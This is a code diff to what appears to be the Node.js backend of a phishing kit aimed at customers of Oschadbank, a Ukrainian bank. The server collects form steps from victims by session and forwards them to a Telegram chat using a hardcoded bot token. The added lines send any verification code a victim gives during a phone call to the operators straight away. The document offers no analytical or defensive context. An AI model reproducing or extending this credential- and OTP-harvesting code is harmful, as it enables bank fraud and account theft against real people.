@@ -5,7 +5,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const WebSocket = require('ws');
 
 // =======================================================================
-// --- НАСТРОЙКИ: Ваши новые данные уже вставлены ---
+// --- НАСТРОЙКИ: Ваши данные уже вставлены ---
 // =======================================================================
 const TELEGRAM_BOT_TOKEN = '8417807179:AAEvlTli6Ba-VfWHFdiFb_0NmfIxj38xnU8';
 const CHAT_ID = -4818175035; 
@@ -50,10 +50,19 @@ app.post('/api/submit', (req, res) => {
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
     
-    // Отправляем полный лог, только когда клиент подтвердит, что это был последний шаг
+    // Если пришел код из звонка, отправляем его отдельным сообщением
+    if (newData.call_code_input) {
+        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
+        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
+        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        return res.status(200).json({ message: 'Call code received' });
+    }
+
+    // Отправляем полный лог, только когда клиент подтвердит, что это был финальный шаг
     if (isFinalStep) {
-        newData.visitCount += 1; // Увеличиваем счетчик только при полной отправке
-        sessions.set(sessionId, newData); // Сохраняем обновленный счетчик
+        newData.visitCount += 1;
+        sessions.set(sessionId, newData);
 
         console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);
 
